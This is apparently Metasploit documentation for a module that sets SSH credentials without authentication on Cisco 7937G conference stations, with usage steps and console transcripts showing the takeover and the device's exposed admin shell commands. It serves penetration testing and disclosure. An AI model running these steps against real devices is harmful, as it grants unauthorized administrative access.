## Vulnerable Application

  [Cisco 7937G](https://www.cisco.com/c/en/us/support/collaboration-endpoints/unified-ip-conference-station-7937g/model.html) Conference Station.
  This module has been tested successfully against firmware versions SCCP-1-4-5-5 and SCCP-1-4-5-7.

### Description

  This module exploits a feature that should not be available via the web interface.
  An unauthenticated user may set the credentials for SSH access to any username and
  password combination desired, giving access to administrative functions through an SSH connection.

## Verification Steps

  1. Obtain a Cisco 7937G Conference Station.
  2. Enable Web Access and SSH Access on the device.
  3. Start msfconsole
  4. Do: `use auxiliary/admin/http/cisco_7937g_ssh_privesc`
  5. Do: `set RHOSTS 192.168.1.10`
  6. Do: `set USER test`
  7. Do: `set PASS test`
  8. Do: `run`
  9. The conference station's SSH service should now be configured with the supplied USER:PASS.

## Options

### PASS

The desired password for setting SSH access

### USER

The desired username for setting SSH access

## Scenarios

### Cisco 7937G Running Firmware Version SCCP-1-4-5-7

#### Successful Scenario

```
msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
user => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
pass => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
rhosts => 192.168.110.209
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run

[*] Running for 192.168.110.209...
[*] 192.168.110.209 - Attempting to set SSH credentials.
[*] 192.168.110.209 - SSH attack finished!
[*] 192.168.110.209 - Try to login using the supplied credentials test:test
[*] 192.168.110.209 - You must specify the key exchange when connecting or the device will be DoS'd!
[*] 192.168.110.209 - ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(linux/ssh/cve_2020_16137) > exit
user@ubuntu:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
test@192.168.110.209's password:

$>help


Commands 1 to 21:
help - Shows basic help for all commands.
echo - Echoes all arguments (arbitrary parameters, up to 9)
psosMaxShow - Show max number of psos objects created.
psosFailuresShow - Show failures of psos api calls.
clearNetStats - Clear statistics counters in Ethernet Driver.
nicheShow - Show statistics of InterNiche stack.
psosIntStackShow - Show information on interrupt stack.
i - Display status of the specified process, or all running processes (Process_name (optional))
checkStack - Checks the stack.
reboot - Reboots the phone with an optional parameter.
logl - Set the lowest log level which will be displayed (0-6)
logs - Set the log level output for a given module ([module] [0-6])
logsa - Set the log level output for all modules. ([0-6])
logt - Set the log display type (0-2)
logd - Dump the log, parameter is reverse order or not.
logda - Print all available log modules and their current level.
setRtRender - Set real time rendering parameters for the log.
lfu - Send the logfiles to the provisioning server(no parameters).
del - Delete specified file.
cat - Concatanate specified files.

Commands 21 to 41:
copy - Copy a file, can be stdout.
ls - List the contents of flash.
ll - List the contents of flash.
d - Display memory.  <address>,<num words>,<size words>
m - Display memory.  <address>,<size words>
ping - Ping a given host (IP or DNS name) [,Data Len in Bytes]
ifShow - Display ethernet interface statistics (no parameters)
showStoredConfig - Display configuration as stored in flash (no parameters)
showRunningConfig - Display the current running configuration (no parameters)
showBackupConfig - Display backup configuration as stored in flash (no parameters)
overrideBackupConfig - Override backup flash config with current config (no parameters)
overrideSecurityBackup - Override backup security sector with current security sector.
resetConfig - Reset the phone to the default settings(setting type [SPIP],[SPIPCS],[SPIPShoreline])
configDhcpSet - Set DHCP parameters in the flash. 
		(DHCP Enabled[YES|NO], Offer Timeout, DHCP Option, DHCP Option Type, 
		Using statically configured boot server[YES|NO])
configDnsSet - Set DNS parameters in the flash. (Primary DNS Server, Secondary DNS Server, DNS Domain)
configNetSet - Set network parameters in the flash. 
		(IP Address, Subnet Mask, Router, VLAN(can be empty))
configProvisioningSet - Set provisioning server parameters in the flash. 
		(Server Name, Using server type[FTP|TFTP|HTTP|HTTPS|FTPS], User, Password)
configSntpSet - Set SNTP parameters in the flash. (sntpserverName,sntpgmtOffset)
nslookup - Find the IP for a given hostname
dnsCacheAShow - Show DNS Cache for A records.

Commands 41 to 61:
dnsCacheSrvShow - Show DNS Cache for SRV records.
dnsCacheAFlush - Flush DNS A records from cache.
version - Display vxWorks bootline, software versions, and hardware version.
hwBoardSerialSet - Set serial number.  !!!!!Should never be used!!!!!.
hwVarSet - Set the contents of a hardware var ([var ID] [new value])
hwVarShow - Display the contents of a hardware var ([var ID])
simulateKeyPress - Send a key Press event to so like it came from hardware.
simulateKeyHold - Send a key Hold event to so like it came from hardware.
simulateKeyRelease - Send a key Release event to so like it came from hardware.
simulateHookUp - Send a hookswitch event to so like it came from hardware.
simulateHookDown - Send a hookswitch event to so like it came from hardware.
ncasMisc - Show misc. non-call information (no parameters)
ncasCb - Show detailed ncas information, related to either call services,
		non-call services, or server information (1, 2, or 3)
uptime - Show phone uptime.
appPrt - Show UI's call status.
fntPrt - Show information about fonts available on phone.
memtop - Shows the top poiter to current memory.
removeScheduledLogEntry - debug
addScheduledLogEntry - debug
fatalError - Simulate fatal error for the phone.

Commands 61 to 81:
enableStrTruncLog - Enable logging of string truncation.
disableStrTruncLog - Disable logging of string truncation.
sendFlashBinImage - Upload binary flash image.
setMac - debug, here because PSOS can't set the MAC.
sg - send a bitmap to the boot server
memShow - Display system memory usage
memDebug - Toggle memory manager trace flag
l2Debug - Toggle memory manager trace flag
wsTest - Web Service Test Tool
fxShow - Display file transfer manager status
utilHostByNameShow - Test utilHostByName
utilDnsShow - Show callbacks for dns queries
dnsCacheShow - Show DNSACacheShow
utilEthLinkShow - Show Ethernet link status
ethConfigTest - Set Ethernet Mode (0 to 4)
timeTest - Test time
contrastChg - Change LCD Contrast
setAdminVlan - Set admin vlan id
setL2Auth - Set L2 Auth Enable/Disable
ipAddrChange - Change ip addr configuration

Commands 81 to 101:
tftpChange - Change tftp addr
arpStats - Print ARP statistics
fxPut - Transfer file to remote
crash - Crash the system
ipAddrShow - Show ip addr
rtosSocketShow - Show rtos socket information
sccpShow - Show protocol
regManagerShow - show registration manager state
uiPrintAll - uiPrintAll
uiPrintSoftKeys - uiPrintSoftKeys
getVoiceQuality - displays voice quality control status
uiPrintLocalSoftKeys - uiPrintLocalSoftKeys
uiStartTone - uiStartTone
uiStopTone - uiStopTone
pegPrintAll - pegPrintAll
uiSMPrintAll - uiStateMachinePrintAll
lldpSMPrintAll - lldpStateMachinePrintAll
saveLogLevels - saveLogLevels
localePrintAll - localePrintAll
ceShow - Show Client Engine Status

Commands 101 to 121:
udiShow - Show Unique Device Indentifier
show - Show Unique Device Indentifier
pbnShow - Display app & bootrom headers
upr - Upgrade to a Rockpile Standalone Image
upm - Upgrade to a Rockpile Manf Image
setHw - Sets the Rockpile Hardware Id
getHw - Prints the Rockpile Hardware Id
setUpf - Sets the Upgrade progress flag
rstUpf - Resets the Upgrade progress flag
setMdm - Sets the Manf diag mode flag
rstMdm - Resets the Manf diag mode flag
setDhcp - Sets the Manf diag dhcp flag
rstDhcp - Resets the Manf diag  dhcp flag
setOrd - Sets the ORD flag
rstOrd - Resets the ORD flag
fs - Prin the status of rockpile flags
cp - Mfg. test diags
vol - Mfg. test diags
sig - Mfg. test diags
os - Mfg. test diags

Commands 121 to 141:
lcd - Mfg. test diags
sum - Prints checksums of flash images
rd - Mfg. test diags
wr - Mfg. test diags
eth - Start/stop ethernet hardware
fstp - Stop FGPIO interface
hfTxEq - Audio testing for large conf rooms
ctConv - perform ct convergence test.
ctModeEnd - terminate ctMode
ctEnableRx - Enable ctRx 1 on, 0 off
ctEnableTx - Enable ctTx 1 on, 0 off
ctMicTx - Route mic # to Tx
ctEMTx - Route external mic # to Tx
ctSineTx - [chan], [freq], [dBm]: Generate tone to Tx (0 => HD, 1 => HF, default HF, 1KHz, -40dBm)
ctRxSpkr - Send directly to HF speaker
ctSineSpkr - [chan], [freq], [dBm]: Generate tone to Rx (0 => HD, 1 => HF, default HF, 1KHz, -40dBm)
ctNoiseSpkr - [chan], [dBm]: Generate noise to Rx (0 => HD, 1 => HF, default HF, -40dBm)
displayListeningPorts - Display listening port and process info 
killListeningProcess - Kill the task associated with the port

$>exit
```

#### Unsuccessful Scenario
```
msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
user => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
pass => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
rhosts => 192.168.110.209
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run

[*] Running for 192.168.110.209...
[*] 192.168.110.209 - Attempting to set SSH credentials.
[-] 192.168.110.209 - Device doesn't appear to be functioning or web access is not enabled.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Cisco 7937G Running Firmware Version SCCP-1-4-5-5

#### Successful Scenario

```
msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
user => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
pass => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
rhosts => 192.168.110.209
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run

[*] Running for 192.168.110.209...
[*] 192.168.110.209 - Attempting to set SSH credentials.
[*] 192.168.110.209 - SSH attack finished!
[*] 192.168.110.209 - Try to login using the supplied credentials test:test
[*] 192.168.110.209 - You must specify the key exchange when connecting or the device will be DoS'd!
[*] 192.168.110.209 - ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(linux/ssh/cve_2020_16137) > exit
user@ubuntu:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 test@192.168.110.209
test@192.168.110.209's password:

$>help


Commands 1 to 21:
help - Shows basic help for all commands.
echo - Echoes all arguments (arbitrary parameters, up to 9)
psosMaxShow - Show max number of psos objects created.
psosFailuresShow - Show failures of psos api calls.
clearNetStats - Clear statistics counters in Ethernet Driver.
nicheShow - Show statistics of InterNiche stack.
psosIntStackShow - Show information on interrupt stack.
i - Display status of the specified process, or all running processes (Process_name (optional))
checkStack - Checks the stack.
reboot - Reboots the phone with an optional parameter.
logl - Set the lowest log level which will be displayed (0-6)
logs - Set the log level output for a given module ([module] [0-6])
logsa - Set the log level output for all modules. ([0-6])
logt - Set the log display type (0-2)
logd - Dump the log, parameter is reverse order or not.
logda - Print all available log modules and their current level.
setRtRender - Set real time rendering parameters for the log.
lfu - Send the logfiles to the provisioning server(no parameters).
del - Delete specified file.
cat - Concatanate specified files.

Commands 21 to 41:
copy - Copy a file, can be stdout.
ls - List the contents of flash.
ll - List the contents of flash.
d - Display memory.  <address>,<num words>,<size words>
m - Display memory.  <address>,<size words>
ping - Ping a given host (IP or DNS name) [,Data Len in Bytes]
ifShow - Display ethernet interface statistics (no parameters)
showStoredConfig - Display configuration as stored in flash (no parameters)
showRunningConfig - Display the current running configuration (no parameters)
showBackupConfig - Display backup configuration as stored in flash (no parameters)
overrideBackupConfig - Override backup flash config with current config (no parameters)
overrideSecurityBackup - Override backup security sector with current security sector.
resetConfig - Reset the phone to the default settings(setting type [SPIP],[SPIPCS],[SPIPShoreline])
configDhcpSet - Set DHCP parameters in the flash. 
		(DHCP Enabled[YES|NO], Offer Timeout, DHCP Option, DHCP Option Type, 
		Using statically configured boot server[YES|NO])
configDnsSet - Set DNS parameters in the flash. (Primary DNS Server, Secondary DNS Server, DNS Domain)
configNetSet - Set network parameters in the flash. 
		(IP Address, Subnet Mask, Router, VLAN(can be empty))
configProvisioningSet - Set provisioning server parameters in the flash. 
		(Server Name, Using server type[FTP|TFTP|HTTP|HTTPS|FTPS], User, Password)
configSntpSet - Set SNTP parameters in the flash. (sntpserverName,sntpgmtOffset)
nslookup - Find the IP for a given hostname
dnsCacheAShow - Show DNS Cache for A records.

Commands 41 to 61:
dnsCacheSrvShow - Show DNS Cache for SRV records.
dnsCacheAFlush - Flush DNS A records from cache.
version - Display vxWorks bootline, software versions, and hardware version.
hwBoardSerialSet - Set serial number.  !!!!!Should never be used!!!!!.
hwVarSet - Set the contents of a hardware var ([var ID] [new value])
hwVarShow - Display the contents of a hardware var ([var ID])
simulateKeyPress - Send a key Press event to so like it came from hardware.
simulateKeyHold - Send a key Hold event to so like it came from hardware.
simulateKeyRelease - Send a key Release event to so like it came from hardware.
simulateHookUp - Send a hookswitch event to so like it came from hardware.
simulateHookDown - Send a hookswitch event to so like it came from hardware.
ncasMisc - Show misc. non-call information (no parameters)
ncasCb - Show detailed ncas information, related to either call services,
		non-call services, or server information (1, 2, or 3)
uptime - Show phone uptime.
appPrt - Show UI's call status.
fntPrt - Show information about fonts available on phone.
memtop - Shows the top poiter to current memory.
removeScheduledLogEntry - debug
addScheduledLogEntry - debug
fatalError - Simulate fatal error for the phone.

Commands 61 to 81:
enableStrTruncLog - Enable logging of string truncation.
disableStrTruncLog - Disable logging of string truncation.
sendFlashBinImage - Upload binary flash image.
setMac - debug, here because PSOS can't set the MAC.
sg - send a bitmap to the boot server
memShow - Display system memory usage
memDebug - Toggle memory manager trace flag
l2Debug - Toggle memory manager trace flag
wsTest - Web Service Test Tool
fxShow - Display file transfer manager status
utilHostByNameShow - Test utilHostByName
utilDnsShow - Show callbacks for dns queries
dnsCacheShow - Show DNSACacheShow
utilEthLinkShow - Show Ethernet link status
ethConfigTest - Set Ethernet Mode (0 to 4)
timeTest - Test time
contrastChg - Change LCD Contrast
setAdminVlan - Set admin vlan id
setL2Auth - Set L2 Auth Enable/Disable
ipAddrChange - Change ip addr configuration

Commands 81 to 101:
tftpChange - Change tftp addr
arpStats - Print ARP statistics
fxPut - Transfer file to remote
crash - Crash the system
ipAddrShow - Show ip addr
rtosSocketShow - Show rtos socket information
sccpShow - Show protocol
regManagerShow - show registration manager state
uiPrintAll - uiPrintAll
uiPrintSoftKeys - uiPrintSoftKeys
getVoiceQuality - displays voice quality control status
uiPrintLocalSoftKeys - uiPrintLocalSoftKeys
uiStartTone - uiStartTone
uiStopTone - uiStopTone
pegPrintAll - pegPrintAll
uiSMPrintAll - uiStateMachinePrintAll
lldpSMPrintAll - lldpStateMachinePrintAll
saveLogLevels - saveLogLevels
localePrintAll - localePrintAll
ceShow - Show Client Engine Status

Commands 101 to 121:
udiShow - Show Unique Device Indentifier
show - Show Unique Device Indentifier
pbnShow - Display app & bootrom headers
upr - Upgrade to a Rockpile Standalone Image
upm - Upgrade to a Rockpile Manf Image
setHw - Sets the Rockpile Hardware Id
getHw - Prints the Rockpile Hardware Id
setUpf - Sets the Upgrade progress flag
rstUpf - Resets the Upgrade progress flag
setMdm - Sets the Manf diag mode flag
rstMdm - Resets the Manf diag mode flag
setDhcp - Sets the Manf diag dhcp flag
rstDhcp - Resets the Manf diag  dhcp flag
setOrd - Sets the ORD flag
rstOrd - Resets the ORD flag
fs - Prin the status of rockpile flags
cp - Mfg. test diags
vol - Mfg. test diags
sig - Mfg. test diags
os - Mfg. test diags

Commands 121 to 141:
lcd - Mfg. test diags
sum - Prints checksums of flash images
rd - Mfg. test diags
wr - Mfg. test diags
eth - Start/stop ethernet hardware
fstp - Stop FGPIO interface
hfTxEq - Audio testing for large conf rooms
ctConv - perform ct convergence test.
ctModeEnd - terminate ctMode
ctEnableRx - Enable ctRx 1 on, 0 off
ctEnableTx - Enable ctTx 1 on, 0 off
ctMicTx - Route mic # to Tx
ctEMTx - Route external mic # to Tx
ctSineTx - [chan], [freq], [dBm]: Generate tone to Tx (0 => HD, 1 => HF, default HF, 1KHz, -40dBm)
ctRxSpkr - Send directly to HF speaker
ctSineSpkr - [chan], [freq], [dBm]: Generate tone to Rx (0 => HD, 1 => HF, default HF, 1KHz, -40dBm)
ctNoiseSpkr - [chan], [dBm]: Generate noise to Rx (0 => HD, 1 => HF, default HF, -40dBm)
displayListeningPorts - Display listening port and process info 
killListeningProcess - Kill the task associated with the port

$>exit
```

#### Unsuccessful Scenario
```
msf5 > use auxiliary/admin/http/cisco_7937g_ssh_privesc 
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set user test
user => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set pass test
pass => test
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > set rhosts 192.168.110.209
rhosts => 192.168.110.209
msf5 auxiliary(admin/http/cisco_7937g_ssh_privesc) > run

[*] Running for 192.168.110.209...
[*] 192.168.110.209 - Attempting to set SSH credentials.
[-] 192.168.110.209 - Device doesn't appear to be functioning or web access is not enabled.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
